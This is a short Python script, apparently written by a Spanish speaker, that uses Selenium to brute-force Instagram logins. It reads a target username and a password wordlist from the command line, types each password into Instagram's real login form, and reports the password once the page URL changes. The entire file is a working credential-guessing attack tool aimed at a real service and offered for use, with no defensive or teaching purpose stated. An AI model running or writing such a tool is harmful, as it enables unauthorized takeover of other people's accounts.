from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
import time 
import argparse


arg = argparse.ArgumentParser(description="Herramiento de fuerza bruta")
arg.add_argument("-u",dest="usuario",help="Pasar un usuario",required=True)
arg.add_argument("-w",dest="wordlist",help="Pasar un wordlist",required=True)
args = arg.parse_args()

user = args.usuario
wordlist = open(args.wordlist,"r")
bot = webdriver.Chrome(ChromeDriverManager().install())
bot.get("https://instagram.com/accounts/login/")

wait = WebDriverWait(bot, 10)
username_input = wait.until(EC.visibility_of_element_located((By.NAME, "username")))


for i in wordlist:
    username_input.clear()
    username_input.send_keys(user)

    # Esperar a que el campo de contraseña esté visible
    password_input = wait.until(EC.visibility_of_element_located((By.NAME, "password")))
    password_input.clear()
    password_input.send_keys(i.strip())

    # Enviar el formulario
    password_input.send_keys(Keys.RETURN)

    # Esperar unos segundos para que la página responda
    time.sleep(2)  # Podrías mejorar esto con `WebDriverWait` dependiendo del cambio de URL o respuesta de la página

    # Comprobar si la URL ha cambiado, lo que significa que el inicio de sesión fue exitoso
    if bot.current_url != "https://instagram.com/accounts/login/":
        print(f"Contraseña correcta {i.strip()}")
        break
    else:
        print(f"Contraseña {i.strip()} incorrecta")

bot.quit()